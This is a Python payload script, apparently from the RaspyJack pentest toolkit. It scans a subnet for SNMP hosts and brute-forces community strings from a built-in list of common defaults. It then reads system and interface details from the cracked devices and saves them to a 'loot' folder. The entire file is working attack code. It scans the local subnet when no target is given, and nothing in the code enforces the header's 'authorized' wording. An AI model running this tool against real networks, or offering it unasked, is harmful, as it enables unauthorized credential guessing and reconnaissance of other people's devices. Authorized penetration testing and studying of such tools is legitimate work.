#!/usr/bin/env python3
# @name: SNMP Community Brute-Force + MIB Walk
# @desc: Probe an authorized host or CIDR for SNMPv1/v2c, test common community strings, query common MIB OIDs, and save discovered data to loot.
# @category: credentials
# @danger: false
# @active: true
# @web: true
"""
RaspyJack Payload -- SNMP Community Brute-Force + MIB Walk
==========================================================
Author: 7h30th3r0n3

Discovers SNMP hosts on the local network (UDP 161), brute-forces
community strings, and walks common MIB OIDs using raw SNMPv1/v2c
packets via scapy.

Controls:
  python3 snmp_walk.py [target_ip_or_cidr]

  target_ip_or_cidr  -- optional. A single host IP tests that host
                         directly. A CIDR (e.g. 192.168.1.0/24) scans
                         that subnet for SNMP hosts first. If omitted,
                         the local subnet is auto-detected and scanned.

  Community strings and cracked MIB values are printed as they are
  found; results are exported to loot when the run finishes (or is
  interrupted with Ctrl-C).

Loot: $CITYPOP_ROOT/loot/SNMP/snmp_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

try:
    from scapy.all import (
        IP, UDP, SNMP, SNMPget, SNMPnext, SNMPvarbind,
        ASN1_OID, ASN1_STRING, sr1, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'SNMP')

COMMUNITY_STRINGS = [
    "public", "private", "community", "manager", "admin",
    "cisco", "snmp", "default", "monitor", "read",
    "write", "test", "guest", "secret", "network",
]

# Common OIDs to walk
WALK_OIDS = {
    "sysDescr": "1.3.6.1.2.1.1.1.0",
    "sysName": "1.3.6.1.2.1.1.5.0",
    "sysLocation": "1.3.6.1.2.1.1.6.0",
    "sysContact": "1.3.6.1.2.1.1.4.0",
    "sysUpTime": "1.3.6.1.2.1.1.3.0",
    "ifNumber": "1.3.6.1.2.1.2.1.0",
    "ifDescr.1": "1.3.6.1.2.1.2.2.1.2.1",
    "ifDescr.2": "1.3.6.1.2.1.2.2.1.2.2",
    "ipForwarding": "1.3.6.1.2.1.4.1.0",
    "ipRouteDest.1": "1.3.6.1.2.1.4.21.1.1",
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
phase = "idle"       # idle | scanning | bruting | walking | done
hosts = []           # [{ip, port}]
results = {}         # {ip: {community: str, oids: {name: value}}}
status_msg = "Ready."
brute_progress = 0   # 0-100


# ---------------------------------------------------------------------------
# Network detection
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Detect local subnet."""
    for candidate in ["eth0", "wlan0"]:
        try:
            r = subprocess.run(["ip", "-4", "addr", "show", candidate],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet "):
                    return line.split()[1]
        except Exception:
            pass
    try:
        r = subprocess.run(["ip", "-4", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                iface = parts[parts.index("dev") + 1]
                r2 = subprocess.run(["ip", "-4", "addr", "show", iface],
                                    capture_output=True, text=True, timeout=5)
                for ln in r2.stdout.splitlines():
                    ln = ln.strip()
                    if ln.startswith("inet "):
                        return ln.split()[1]
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# SNMP helper: raw get request
# ---------------------------------------------------------------------------

def _snmp_get(target_ip, community, oid, timeout_sec=2):
    """Send SNMP GET and return response value string or None."""
    try:
        pkt = (IP(dst=target_ip)
               / UDP(sport=44161, dport=161)
               / SNMP(community=community,
                      PDU=SNMPget(varbindlist=[
                          SNMPvarbind(oid=ASN1_OID(oid))])))
        resp = sr1(pkt, timeout=timeout_sec, verbose=False)
        if resp and resp.haslayer(SNMP):
            snmp_layer = resp[SNMP]
            try:
                varbind = snmp_layer.PDU.varbindlist[0]
                val = varbind.value
                if hasattr(val, "val"):
                    return str(val.val)
                return str(val)
            except Exception:
                pass
    except Exception:
        pass
    return None


def _snmp_probe(target_ip, community, timeout_sec=2):
    """Quick SNMP probe: try sysDescr to verify community string."""
    return _snmp_get(target_ip, community, "1.3.6.1.2.1.1.1.0", timeout_sec)


# ---------------------------------------------------------------------------
# Host discovery
# ---------------------------------------------------------------------------

def _scan_hosts(cidr):
    """Scan subnet for SNMP hosts (UDP 161 reachable)."""
    global phase, status_msg
    found = []

    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        with lock:
            phase = "idle"
            status_msg = "Invalid subnet"
        print(f"[!] Invalid subnet: {cidr}", flush=True)
        return found

    host_ips = [str(h) for h in network.hosts()]
    # Limit to /24 at most
    if len(host_ips) > 254:
        host_ips = host_ips[:254]

    for i, ip in enumerate(host_ips):
        if not _running:
            break
        with lock:
            status_msg = f"Probing {ip} ({i + 1}/{len(host_ips)})"
        if (i + 1) % 25 == 0:
            print(f"[*] Probing... {i + 1}/{len(host_ips)}", flush=True)

        # Quick UDP probe using socket
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            # Send a minimal SNMPv1 GET sysDescr
            snmp_req = (
                b"\x30\x29\x02\x01\x00\x04\x06public"
                b"\xa0\x1c\x02\x04\x00\x00\x00\x01"
                b"\x02\x01\x00\x02\x01\x00"
                b"\x30\x0e\x30\x0c\x06\x08"
                b"\x2b\x06\x01\x02\x01\x01\x01\x00"
                b"\x05\x00"
            )
            sock.sendto(snmp_req, (ip, 161))
            data, _ = sock.recvfrom(4096)
            if data:
                found.append({"ip": ip, "port": 161})
                print(f"[+] SNMP host found: {ip}", flush=True)
        except (socket.timeout, OSError):
            pass
        finally:
            if sock:
                sock.close()

    with lock:
        hosts.clear()
        hosts.extend(found)
        phase = "idle"
        if found:
            status_msg = f"Found {len(found)} SNMP hosts"
        else:
            status_msg = "No SNMP hosts found"

    return found


# ---------------------------------------------------------------------------
# Brute-force + walk
# ---------------------------------------------------------------------------

def _brute_walk(target_hosts):
    """Brute-force community strings then walk MIBs."""
    global phase, status_msg, brute_progress

    total_attempts = len(target_hosts) * len(COMMUNITY_STRINGS)
    done = 0

    for host in target_hosts:
        if not _running:
            break
        ip = host["ip"]

        for comm in COMMUNITY_STRINGS:
            if not _running:
                break
            done += 1
            with lock:
                brute_progress = int(done / max(total_attempts, 1) * 100)
                status_msg = f"Trying {ip} / {comm}"

            resp = _snmp_probe(ip, comm, timeout_sec=1)
            if resp:
                with lock:
                    if ip not in results:
                        results[ip] = {"community": comm, "oids": {}}
                    else:
                        results[ip] = {**results[ip], "community": comm}
                print(f"[+] Cracked {ip}: community='{comm}'", flush=True)
                break

    # Walk OIDs on successful hosts
    with lock:
        successful = {ip: data["community"] for ip, data in results.items()}

    for ip, comm in successful.items():
        if not _running:
            break
        with lock:
            status_msg = f"Walking {ip}..."
        print(f"[*] Walking MIBs on {ip}...", flush=True)

        oid_data = {}
        for name, oid in WALK_OIDS.items():
            if not _running:
                break
            val = _snmp_get(ip, comm, oid, timeout_sec=2)
            if val:
                oid_data[name] = val
                print(f"    {name}: {val}", flush=True)

        with lock:
            if ip in results:
                results[ip] = {**results[ip], "oids": oid_data}

    with lock:
        phase = "done"
        found_count = len(results)
        status_msg = f"Done: {found_count} hosts cracked"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write results to JSON."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"snmp_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "hosts_found": len(hosts),
            "cracked": len(results),
            "results": {ip: dict(info) for ip, info in results.items()},
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 snmp_walk.py [target_ip_or_cidr]", flush=True)
        return 0

    if not SCAPY_OK:
        print("[!] scapy not found. Install with: pip3 install scapy", flush=True)
        return 1

    args = sys.argv[1:]
    target_arg = args[0] if len(args) > 0 else None

    host_list = []
    try:
        if target_arg:
            if "/" in target_arg:
                print(f"[*] Scanning {target_arg} for SNMP hosts (UDP 161)...", flush=True)
                host_list = _scan_hosts(target_arg)
            else:
                host_list = [{"ip": target_arg, "port": 161}]
                with lock:
                    hosts.clear()
                    hosts.extend(host_list)
                print(f"[*] Using target: {target_arg}", flush=True)
        else:
            cidr = _detect_subnet()
            if not cidr:
                print("[!] Could not detect local subnet. Provide a target or "
                      "CIDR as an argument.", flush=True)
                return 1
            print(f"[*] Scanning {cidr} for SNMP hosts (UDP 161)...", flush=True)
            host_list = _scan_hosts(cidr)

        if not host_list:
            print("[!] No SNMP hosts to test.", flush=True)
            return 1

        print(f"[*] {len(host_list)} host(s) to test.", flush=True)
        print("[*] Brute-forcing community strings and walking MIBs...", flush=True)
        _brute_walk(host_list)

    except KeyboardInterrupt:
        _running = False
        print("\n[*] Interrupted.", flush=True)

    with lock:
        result_list = list(results.items())

    if result_list:
        print(f"[*] Cracked {len(result_list)} host(s):", flush=True)
        for ip, info in result_list:
            print(f"  {ip} community={info['community']}", flush=True)
            for name, val in info.get("oids", {}).items():
                print(f"      {name}: {val}", flush=True)
    else:
        print("[*] No community strings cracked.", flush=True)

    fname = _export_loot()
    print(f"[*] Exported to {os.path.join(LOOT_DIR, fname)}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
